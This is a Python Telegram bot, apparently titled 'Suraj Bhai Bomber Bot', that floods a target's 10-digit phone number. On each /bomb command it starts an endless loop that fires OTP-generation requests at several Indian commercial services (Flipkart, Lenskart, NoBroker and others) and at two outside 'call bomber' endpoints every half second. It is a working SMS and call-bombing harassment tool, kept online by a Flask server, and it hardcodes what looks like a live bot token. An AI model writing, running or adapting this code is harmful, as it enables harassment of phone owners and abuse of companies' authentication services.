import logging
import threading
import time
import random
import requests
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
from flask import Flask

# ================= CONFIGURATION =================
TELEGRAM_BOT_TOKEN = "9116537219:AAGYevPHlV0uaE7LaRwzzjBY1Qlq14XgA5w"
CHANNEL_SIGNATURE = "vip"
# =================================================

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Flask app for 24/7 Cloud Uptime
flask_app = Flask('')

@flask_app.route('/')
def home():
    return "🤖 Suraj Bhai Bomber Bot is 24/7 Alive and Active!"

def run_flask():
    flask_app.run(host='0.0.0.0', port=8080)

# Global tracking variables
BOMBER_STATS = {
    "total_success_sent": 0,
    "active_targets": 0
}

# Optimized HTTP Session
session = requests.Session()
adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100)
session.mount('https://', adapter)
session.mount('http://', adapter)

# Working API Endpoints with proper headers
APIS = [
    {
        "name": "Flipkart", 
        "url": lambda p: "https://2.rome.api.flipkart.com/api/4/user/otp/generate", 
        "method": "POST", 
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }, 
        "data": lambda p: '{"mobileNumber":"' + p + '"}'
    },
    {
        "name": "Shopsy", 
        "url": lambda p: "https://www.shopsy.in/api/v1/user/otp/generate", 
        "method": "POST", 
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }, 
        "data": lambda p: '{"mobileNumber":"' + p + '"}'
    },
    {
        "name": "Lenskart", 
        "url": lambda p: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", 
        "method": "POST", 
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }, 
        "data": lambda p: '{"phoneCode":"+91","telephone":"' + p + '"}'
    },
    {
        "name": "Hungama", 
        "url": lambda p: "https://communication.api.hungama.com/v1/communication/otp", 
        "method": "POST", 
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }, 
        "data": lambda p: '{"mobileNo":"' + p + '","countryCode":"+91","appCode":"un"}'
    },
    {
        "name": "NoBroker", 
        "url": lambda p: "https://www.nobroker.in/api/v3/account/otp/send", 
        "method": "POST", 
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0"
        }, 
        "data": lambda p: f"phone={p}&countryCode=IN"
    },
    {
        "name": "ShipRocket", 
        "url": lambda p: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", 
        "method": "POST", 
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }, 
        "data": lambda p: '{"mobileNumber":"' + p + '"}'
    },
    {
        "name": "Call Bomber API", 
        "url": lambda p: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}", 
        "method": "GET", 
        "headers": {"User-Agent": "Mozilla/5.0"}
    },
    {
        "name": "Bomberr API", 
        "url": lambda p: f"https://bomberr.onrender.com/num={p}", 
        "method": "GET", 
        "headers": {"User-Agent": "Mozilla/5.0"}
    },
]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_msg = (
        f"╔═══════════════════════════════════╗\n"
        f"✨ **Suraj Bhai Bot Activated** ✨\n"
        f"╚═══════════════════════════════════╝\n\n"
        f"🚀 **Command:**\n"
        f"👉 `/bomb <10_digit_number>`\n"
        f"👉 `/stats`\n\n"
        f"👑 *Powered By:* {CHANNEL_SIGNATURE}"
    )
    await update.message.reply_text(welcome_msg, parse_mode="Markdown")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats_msg = (
        f"📊 **Live Statistics**\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Real Success Responses: `{BOMBER_STATS['total_success_sent']}`\n"
        f"🎯 Active Targets: `{BOMBER_STATS['active_targets']}`\n"
        f"👑 *Powered By:* {CHANNEL_SIGNATURE}"
    )
    await update.message.reply_text(stats_msg, parse_mode="Markdown")

def send_request(api, target_phone):
    try:
        url = api["url"](target_phone)
        headers = api["headers"]
        
        if api["method"] == "GET":
            response = session.get(url, headers=headers, timeout=3)
        else:
            data = api["data"](target_phone)
            response = session.post(url, headers=headers, data=data, timeout=3)
        
        # Sirf tab count hoga jab server successful response dega
        if response.status_code in [200, 201, 202]:
            BOMBER_STATS["total_success_sent"] += 1
    except Exception:
        pass

async def handle_bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Kripya number dein! Example: `/bomb 9876543210`", parse_mode="Markdown")
        return
    
    target_phone = context.args[0].strip()
    if not target_phone.isdigit() or len(target_phone) != 10:
        await update.message.reply_text("❌ Kripya 10 digit ka valid number dein.", parse_mode="Markdown")
        return

    BOMBER_STATS["active_targets"] += 1
    await update.message.reply_text(f"🎯 Target `{target_phone}` par real requests shuru ho chuki hain!", parse_mode="Markdown")
    
    threading.Thread(target=run_loop, args=(target_phone,)).start()

def run_loop(target_phone):
    try:
        while True:
            with ThreadPoolExecutor(max_workers=20) as executor:
                for api in APIS:
                    executor.submit(send_request, api, target_phone)
            time.sleep(0.5)
    except Exception:
        pass
    finally:
        BOMBER_STATS["active_targets"] -= 1

def main():
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("bomb", handle_bomb_command))

    app.run_polling()

if __name__ == '__main__':
    main()
